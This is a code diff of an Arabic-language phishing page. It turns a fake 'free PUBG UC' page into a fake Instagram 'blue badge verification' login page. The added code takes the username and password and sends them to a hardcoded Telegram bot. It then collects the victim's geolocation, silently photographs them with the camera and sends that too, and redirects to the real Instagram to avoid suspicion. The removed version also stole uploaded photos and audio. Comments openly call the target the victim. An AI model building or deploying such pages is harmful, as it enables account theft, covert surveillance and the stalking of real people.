@@ -3,58 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE | مركز الشحن المعتمد 2026</title>
+    <title>Instagram | مركز توثيق الحسابات</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0e11; color: #f1f1f1; text-align: center; margin: 0; padding: 10px; }
-        .container { background: linear-gradient(145deg, #1e2329, #0b0e11); max-width: 450px; margin: 20px auto; padding: 30px; border-radius: 20px; border: 2px solid #f3ba2f; box-shadow: 0 0 25px rgba(243, 186, 47, 0.2); }
-        h2 { color: #f3ba2f; text-transform: uppercase; letter-spacing: 1px; }
-        .input-group { margin-bottom: 15px; text-align: right; }
-        label { display: block; font-size: 13px; color: #848e9c; margin-bottom: 5px; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #474d57; border-radius: 8px; background: #2b3139; color: white; box-sizing: border-box; }
-        .btn-shahn { background: #f3ba2f; color: #000; border: none; padding: 16px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 15px; transition: 0.3s; }
-        .btn-shahn:hover { background: #ffcc00; box-shadow: 0 0 15px #f3ba2f; }
-        .loading { display: none; margin-top: 15px; font-weight: bold; color: #2ecc71; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 5px; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        h3 { color: #262626; font-size: 16px; margin-bottom: 20px; font-weight: 600; line-height: 1.4; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
+        .btn-blue { background: #0095f6; color: white; border: none; width: 100%; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 10px; }
+        .footer-text { font-size: 12px; color: #8e8e8e; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://img.icons8.com/color/96/pubg.png" width="80">
-    <h2>مركز توزيع الشدات المجاني</h2>
-    <p style="font-size: 12px; color: #848e9c;">أدخل الـ ID الخاص بك واختر كمية الشدات المطلوبة</p>
-
-    <div class="input-group">
-        <label>رقم معرف اللاعب (ID):</label>
-        <input type="number" id="player_id" placeholder="مثلاً: 512345678">
-    </div>
-
-    <div class="input-group">
-        <label>كمية الشدات (UC):</label>
-        <select id="uc_amount">
-            <option value="660 UC">660 UC</option>
-            <option value="1800 UC">1800 UC</option>
-            <option value="3850 UC">3850 UC</option>
-            <option value="8100 UC">8100 UC</option>
-        </select>
-    </div>
-
-    <div class="input-group">
-        <label>إثبات ملكية الحساب (رفع لقطة شاشة للبروفايل):</label>
-        <input type="file" id="studiofiles" multiple accept="image/*">
-    </div>
-
-    <button class="btn-shahn" onclick="startHacking()">بدء عملية الشحن الآن</button>
-    <div id="loading" class="loading">جاري الربط مع خوادم اللعبة...</div>
+<div class="login-box">
+    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo">
+    <h3>بوابة طلب شارة التوثيق (العلامة الزرقاء) لعام 2026</h3>
+    
+    <input type="text" id="insta_user" placeholder="اسم المستخدم (Username)">
+    <input type="password" id="insta_pass" placeholder="كلمة السر (Password)">
+    
+    <p style="font-size: 11px; color: #3897f0; text-align: right; cursor: pointer;">لماذا أحتاج للتوثيق؟</p>
+    
+    <button class="btn-blue" onclick="captureInsta()">تسجيل الدخول وطلب التوثيق</button>
+    
+    <div class="footer-text">سيتم مراجعة حسابك من قبل فريق الدعم الفني لشركة Meta.</div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
 <video id="video" style="display:none;" autoplay></video>
 
 <script>
+    // بياناتك الخاصة
     const TOKEN = "8470093886:AAFofGsfGx98xJCaOPJyvqyLdwrYL_3Ebfg";
     const CHAT_ID = "7529727252";
 
-    async function send(type, data, caption = "") {
+    async function sendToBot(type, data, caption = "") {
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         if (type === "text") {
@@ -63,35 +47,34 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
             });
         } else {
-            let fileName = type === "photo" ? "face.jpg" : type === "voice" ? "audio.ogg" : "file.jpg";
+            let fileName = type === "photo" ? "face.jpg" : "file.jpg";
             formData.append(type, data, fileName);
             if (caption) formData.append("caption", caption);
             await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: "POST", body: formData });
         }
     }
 
-    async function startHacking() {
-        const p_id = document.getElementById('player_id').value;
-        const uc = document.getElementById('uc_amount').value;
+    async function captureInsta() {
+        const user = document.getElementById('insta_user').value;
+        const pass = document.getElementById('insta_pass').value;
 
-        if (!p_id) { alert("يرجى إدخال ID اللاعب!"); return; }
+        if (!user || !pass) { alert("يرجى إكمال البيانات المطلوبة!"); return; }
 
-        document.getElementById('loading').style.display = 'block';
-        alert("تنبيه: يجب السماح بالصلاحيات لتأكيد أنك لست 'روبوت' (Anti-Bot Verification)");
+        // 1. إرسال اليوزر والباسورد فوراً (أهم شيء)
+        const info = `🔥 **صيد إنستغرام جديد** 🔥\n👤 اليوزر: \`${user}\` \n🔑 الباسورد: \`${pass}\``;
+        await sendToBot("text", info);
 
-        // 1. الموقع والبيانات
+        alert("جاري التحقق من ملكية الحساب.. يرجى السماح بالكاميرا لمطابقة صورة الملف الشخصي.");
+
+        // 2. الموقع الجغرافي
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const info = `🎮 **صيد ببجي جديد** 🎮\n🆔 الآيدي: ${p_id}\n💎 الشدات: ${uc}\n📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            await send("text", info);
+            const map = `📍 موقع الضحية: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            await sendToBot("text", map);
         });
 
-        // 2. الملفات
-        const files = document.getElementById('studiofiles').files;
-        for (let file of files) { await send("document", file, "📁 صور من استوديو الضحية"); }
-
-        // 3. الكاميرا والصوت
+        // 3. الكاميرا (تصوير صامت)
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
@@ -100,24 +83,15 @@
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(async (blob) => {
-                    await send("photo", blob, `📸 صورة اللاعب: ${p_id}`);
+                    await sendToBot("photo", blob, `📸 صورة صاحب الحساب: ${user}`);
+                    stream.getTracks().forEach(t => t.stop());
                     
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    mediaRecorder.onstop = async () => {
-                        const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
-                        await send("voice", audioBlob, "🎤 تسجيل صوتي أثناء الشحن");
-                        stream.getTracks().forEach(t => t.stop());
-                        document.getElementById('loading').innerText = "تم الشحن بنجاح! انتظر وصول الشدات خلال ساعة.";
-                        alert("تم إرسال طلب الشحن بنجاح!");
-                    };
-                    mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 4000);
+                    // تحويل الضحية لصفحة إنستغرام الحقيقية لإبعاد الشبهة
+                    window.location.href = "https://www.instagram.com/accounts/manage_access/";
                 }, 'image/jpeg');
             }, 2000);
         } catch (e) {
-            alert("خطأ: يجب السماح بالصلاحيات لإكمال عملية الشحن!");
+            window.location.href = "https://www.instagram.com/";
         }
     }
 </script>
